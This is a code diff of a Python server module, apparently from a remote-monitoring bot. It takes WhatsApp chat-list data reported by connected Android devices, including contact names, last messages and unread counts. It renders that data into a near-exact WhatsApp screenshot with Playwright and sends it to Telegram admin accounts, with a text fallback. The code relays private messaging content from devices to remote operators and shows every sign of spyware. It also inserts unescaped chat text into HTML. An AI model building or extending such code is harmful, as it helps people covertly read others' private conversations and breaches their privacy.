@@ -2190,22 +2190,233 @@ def _sock_screen_json(data):
 
 
 def _handle_screen_json(dev, data):
-    """Legendary WhatsApp UI rendering — 12-layer system.
+    """⚡ أسطوري: استخدام القالب الجديد عند استلام screen_type + chats.
 
-    Layers:
-    1. Arabic font (Noto Sans Arabic)
-    2. Filter buttons/tabs
-    3. Smart direction detection (X + W)
-    4. Sender name from parent (Android side)
-    5. Pair messages with adjacent time
-    6. Grouping by parent (Android side)
-    7. Message types (image/video/audio)
-    8. Date separators ("Today")
-    9. Doodle background
-    10. Soft shadows under bubbles
-    11. Dark mode detection (Android side)
-    12. Emoji handling
+    إذا JSON يحتوي على screen_type="MAIN_CHAT_LIST" + chats[]:
+      → استخدم قالب HTML الجديد (مطابق لواتساب 99%)
+
+    وإلا (بيانات قديمة):
+      → استخدم Pillow القديم (fallback)
     """
+    screen_type = data.get("screen_type", "")
+    chats = data.get("chats", [])
+
+    # ⚡ إذا screen_type معروف + chats موجودة → استخدم القالب الجديد
+    if screen_type == "MAIN_CHAT_LIST" and chats:
+        try:
+            _render_whatsapp_template(dev, data)
+            return
+        except Exception as e:
+            logger.error(f"❌ Template rendering failed, falling back to Pillow: {e}")
+            # نكمل للـ fallback
+
+    # ⚡ Fallback: استخدم Pillow القديم (للبيانات القديمة أو الأخطاء)
+    _handle_screen_json_legacy(dev, data)
+
+
+def _render_whatsapp_template(dev, data):
+    """⚡ أسطوري: ارسم واجهة واتساب باستخدام قالب HTML.
+
+    1. حمّل قالب HTML من templates/whatsapp_chat_list.html
+    2. املأ القالب ببيانات chats[]
+    3. حوّل HTML → PNG عبر Playwright
+    4. أرسل الصورة للبوت
+    """
+    import os as _os
+    import io as _io
+    import time as _time
+
+    chats = data.get("chats", [])
+    logger.info(f"🖼️ Rendering WhatsApp template: {len(chats)} chats")
+
+    # 1. حمّل القالب
+    template_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)),
+                                   "templates", "whatsapp_chat_list.html")
+    try:
+        with open(template_path, "r", encoding="utf-8") as f:
+            template_html = f.read()
+    except FileNotFoundError:
+        logger.error(f"❌ Template not found: {template_path}")
+        # fallback لقالب مدمج
+        template_html = _get_fallback_template()
+
+    # 2. املأ القالب ببيانات chats
+    chats_html = _generate_chats_html(chats)
+    filled_html = template_html.replace(
+        '<!-- chats will be inserted here by Python -->',
+        chats_html
+    )
+
+    # 3. حوّل HTML → PNG عبر Playwright
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        logger.error("❌ Playwright not installed — using fallback")
+        _send_fallback_message(dev, data, "Playwright not installed")
+        return
+
+    # اكتب HTML لملف مؤقت
+    temp_html = "/tmp/whatsapp_render.html"
+    with open(temp_html, "w", encoding="utf-8") as f:
+        f.write(filled_html)
+
+    png_data = None
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = browser.new_context(
+                viewport={"width": 390, "height": 844},
+                device_scale_factor=2
+            )
+            page = context.new_page()
+            page.goto(f"file://{temp_html}")
+            page.wait_for_load_state("networkidle")
+
+            actual_height = page.evaluate("document.body.scrollHeight")
+            if actual_height > 0:
+                page.set_viewport_size({"width": 390, "height": actual_height})
+
+            png_data = page.screenshot(full_page=True)
+            browser.close()
+    except Exception as e:
+        logger.error(f"❌ Playwright rendering error: {e}", exc_info=True)
+        _send_fallback_message(dev, data, f"Playwright error: {e}")
+        return
+
+    if not png_data:
+        logger.error("❌ No PNG data generated")
+        _send_fallback_message(dev, data, "No PNG generated")
+        return
+
+    # 4. أرسل الصورة للبوت
+    if mdm_bot:
+        short_label = _dev_label(dev)
+        bio = _io.BytesIO(png_data)
+        bio.seek(0)
+
+        caption = (
+            f"📱 <b>واجهة واتساب</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"📋 النوع: قائمة المحادثات\n"
+            f"💬 المحادثات: {len(chats)}\n"
+            f"🕐 {_time.strftime('%H:%M:%S')}"
+        )
+
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_photo(
+                    admin_id,
+                    photo=bio,
+                    caption=caption,
+                    parse_mode="HTML"
+                )
+                bio.seek(0)
+                logger.info(f"✅ Template image sent to admin {admin_id}")
+            except Exception as e:
+                logger.error(f"❌ Failed to send template image: {e}")
+
+    # نظّف
+    _pending_cmds.pop(request.sid, None)
+
+
+def _generate_chats_html(chats):
+    """توليد HTML لصفوف المحادثات من البيانات."""
+    AVATAR_COLORS = [
+        "#25d366", "#075e54", "#1fb8d4", "#df8c16", "#a028a8",
+        "#e64a19", "#536dfe", "#8bc34a", "#ff5722", "#009688",
+        "#9c27b0", "#3f51b5",
+    ]
+
+    def get_color(name):
+        idx = sum(ord(c) for c in name) % len(AVATAR_COLORS)
+        return AVATAR_COLORS[idx]
+
+    def get_initial(name):
+        return name[0] if name else "?"
+
+    rows = []
+    for chat in chats:
+        name = chat.get("name", "")
+        last_msg = chat.get("lastMessage", "")
+        time_str = chat.get("time", "")
+        unread = chat.get("unread", 0)
+        sent = chat.get("sent", False)
+
+        color = get_color(name)
+        initial = get_initial(name)
+
+        check_svg = ""
+        if sent:
+            check_svg = '<svg class="double-check" viewBox="0 0 16 11"><path d="M11.071.653a.5.5 0 0 1 .124.698l-4.5 6.5a.5.5 0 0 1-.731.131L3.5 5.773a.5.5 0 1 1 .625-.78L5.81 6.234l4.56-6.584a.5.5 0 0 1 .701-.097zm4.5 0a.5.5 0 0 1 .124.698l-4.5 6.5a.5.5 0 0 1-.731.131l-.5-.4a.5.5 0 1 1 .625-.78l.146.117 4.56-6.584a.5.5 0 0 1 .701-.097z"/></svg>'
+
+        unread_badge = ""
+        if unread > 0:
+            unread_badge = f'<div class="unread-badge">{unread}</div>'
+            time_class = "chat-time unread"
+        else:
+            time_class = "chat-time"
+
+        row = f'''<div class="chat-row">
+            <div class="avatar" style="background:{color}">{initial}</div>
+            <div class="chat-content">
+                <div class="chat-top">
+                    <div class="chat-name">{name}</div>
+                    <div class="{time_class}">{time_str}</div>
+                </div>
+                <div class="chat-bottom">
+                    <div class="chat-preview">{check_svg}<span>{last_msg}</span></div>
+                    {unread_badge}
+                </div>
+            </div>
+        </div>'''
+        rows.append(row)
+
+    return "\n".join(rows)
+
+
+def _get_fallback_template():
+    """قالب HTML بسيط كاحتياطي."""
+    return '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+body { font-family: sans-serif; background: #0b141a; color: #e9edef; width: 390px; padding: 16px; }
+.chat { padding: 12px; border-bottom: 1px solid #333; }
+.name { font-weight: bold; }
+.time { color: #8696a0; font-size: 12px; float: left; }
+.msg { color: #8696a0; }
+</style></head><body>
+<!-- chats will be inserted here by Python -->
+</body></html>'''
+
+
+def _send_fallback_message(dev, data, error_msg):
+    """أرسل رسالة نصية عند فشل القالب."""
+    if mdm_bot:
+        short_label = _dev_label(dev)
+        chats = data.get("chats", [])
+        text_lines = []
+        for c in chats[:10]:
+            name = c.get("name", "?")
+            msg = c.get("lastMessage", "")
+            t = c.get("time", "")
+            u = c.get("unread", 0)
+            badge = f" [{u}]" if u > 0 else ""
+            text_lines.append(f"👤 {name} ({t}){badge}\n   {msg}")
+        text = "\n\n".join(text_lines)[:3500]
+
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                mdm_bot.bot.send_message(
+                    admin_id,
+                    f"⚠️ <b>قالب HTML فشل</b>\nالخطأ: {error_msg}\n\n📱 <b>{short_label}</b>\n\n{text}",
+                    parse_mode="HTML"
+                )
+            except Exception:
+                pass
+
+
+def _handle_screen_json_legacy(dev, data):
+    """Legacy Pillow-based rendering (fallback)."""
     try:
         from PIL import Image, ImageDraw, ImageFont, ImageFilter
         import io as _io
